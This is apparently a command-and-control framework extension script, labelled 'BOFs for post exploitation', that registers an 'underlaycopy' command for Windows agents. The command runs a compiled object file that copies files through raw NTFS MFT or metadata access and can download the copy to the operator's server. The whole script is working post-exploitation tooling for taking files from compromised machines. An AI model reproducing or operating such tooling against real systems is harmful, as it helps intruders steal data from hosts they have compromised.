var metadata = {
    name: "PostEx-BOF",
    description: "BOFs for post exploitation"
};

/// COMMANDS

var cmd_underlaycopy = ax.create_command("underlaycopy", "Copy file using low-level NTFS access (MFT or Metadata mode)", "underlaycopy MFT C:\\Windows\\System32\\notepad.exe -w C:\\temp\\notepad_copy.exe");
cmd_underlaycopy.addArgString("mode", true, "Copy mode: MFT or Metadata");
cmd_underlaycopy.addArgString("source", true, "Source file path");
cmd_underlaycopy.addArgFlagString("-w", "destination", "Destination file path (required if --download is not used)", "");
cmd_underlaycopy.addArgBool("--download", "Download file to server instead of saving to disk");
cmd_underlaycopy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let mode = parsed_json["mode"];
    let source = parsed_json["source"];
    let dest = parsed_json["destination"] || "";
    let download = parsed_json["--download"] ? 1 : 0;

    if (mode !== "MFT" && mode !== "Metadata") {
        ax.console_message(id, "Error: Mode must be 'MFT' or 'Metadata'", "error");
        return;
    }

    // If destination starts with '--', it's likely a flag, not a destination path
    if (dest && dest.startsWith("--")) {
        dest = "";
    }

    if (!download && !dest) {
        ax.console_message(id, "Error: Either destination path or --download option must be provided", "error");
        return;
    }

    // Always pass destination (empty string if not provided)
    // The order matters: mode, source, dest, download
    let bof_params = ax.bof_pack("cstr,cstr,cstr,int", [mode, source, dest || "", download]);
    let bof_path = ax.script_dir() + "_bin/underlaycopy." + ax.arch(id) + ".o";

    let cmd = "execute bof";
    if (ax.agent_info(id, "type") == "kharon") { cmd = "exec-bof"; }

    let task_desc = download ? "Task: UnderlayCopy file copy and download to server" : "Task: UnderlayCopy file copy";
    ax.execute_alias(id, cmdline, `${cmd} ${bof_path} ${bof_params}`, task_desc);
});

var group_underlaycopy = ax.create_commands_group("UnderlayCopy-BOF", [cmd_underlaycopy]);
ax.register_commands_group(group_underlaycopy, ["beacon", "gopher"], ["windows"], []);

